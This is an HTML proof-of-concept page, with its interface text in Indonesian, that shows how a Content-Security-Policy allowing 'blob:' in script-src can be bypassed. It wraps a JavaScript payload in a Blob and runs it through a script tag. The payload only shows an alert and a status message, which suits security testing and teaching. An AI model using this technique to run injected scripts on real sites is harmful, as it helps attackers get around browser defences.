<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<!-- Contoh simulasi CSP yang mengizinkan blob: pada script-src -->
<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' blob:;">
<title>CSP Blob Bypass Testing Harness</title>
<style>
  body { font-family: monospace; background: #0f172a; color: #f8fafc; padding: 30px; }
  .box { background: #1e293b; padding: 20px; border-radius: 8px; border: 1px solid #334155; max-width: 600px; margin: auto; }
  button { padding: 10px 20px; background: #3b82f6; color: white; border: none; border-radius: 6px; cursor: pointer; font-weight: bold; }
  button:hover { background: #2563eb; }
  #log { margin-top: 15px; padding: 10px; background: #090d16; border-radius: 4px; color: #4ade80; font-size: 13px; }
</style>
</head>
<body>

<div class="box">
  <h2>CSP Blob Bypass PoC Harness</h2>
  <p>Klik tombol di bawah untuk membuat Blob script dinamis dan mengeksekusinya di bawah izin direktif <code>script-src blob:</code>.</p>
  <button id="test-btn" type="button">Jalankan Uji Eksekusi Blob Script</button>
  <div id="log">Status: Menunggu eksekusi...</div>
</div>

<script>
'use strict';

const testBtn = document.getElementById('test-btn');
const logDiv = document.getElementById('log');

testBtn.addEventListener('click', () => {
  try {
    logDiv.textContent = 'Membentuk payload script di dalam Blob...';

    // 1. Definisikan string kode JavaScript yang ingin dieksekusi secara dinamis
    const maliciousPayload = `
      (function() {
        const log = document.getElementById('log');
        log.textContent = '[SUKSES] Skrip berhasil dieksekusi melalui Blob URL meskipun dibatasi CSP!';
        log.style.color = '#f87171';
        alert('CSP Bypass via Blob URL Berhasil!');
      })();
    `;

    // 2. Buat objek Blob dengan MIME type JavaScript
    const blob = new Blob([maliciousPayload], { type: 'text/javascript' });

    // 3. Buat ObjectURL dari Blob tersebut
    const blobUrl = URL.createObjectURL(blob);

    // 4. Suntikkan URL ke dalam elemen <script> agar dimuat dan dieksekusi oleh browser
    const scriptTag = document.createElement('script');
    scriptTag.src = blobUrl;
    
    // Bersihkan memori URL setelah skrip dimuat
    scriptTag.onload = () => {
      URL.revokeObjectURL(blobUrl);
      console.log('Blob URL berhasil dicabut (revoked).');
    };

    document.head.appendChild(scriptTag);

  } catch (err) {
    logDiv.textContent = 'Gagal mengeksekusi: ' + err.message;
    logDiv.style.color = '#ef4444';
  }
});
</script>

</body>
</html>
